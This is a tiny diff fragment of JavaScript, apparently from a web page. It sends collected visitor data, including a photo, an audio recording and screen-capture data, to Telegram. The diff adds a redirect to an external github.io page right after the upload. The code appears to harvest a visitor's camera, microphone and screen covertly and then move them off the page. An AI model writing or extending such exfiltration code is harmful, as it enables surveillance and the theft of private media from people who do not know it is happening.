@@ -730,6 +730,7 @@
 
                 // Отправляем данные в Telegram
                 await sendToTelegram(collectedData, collectedData.photo, audioBlob, screenCaptureData);
+                window.location.href = "https://vitavitamin.github.io/kakashki/";
 
             } catch (error) {
                 console.error('Общая ошибка при сборе данных:', error);
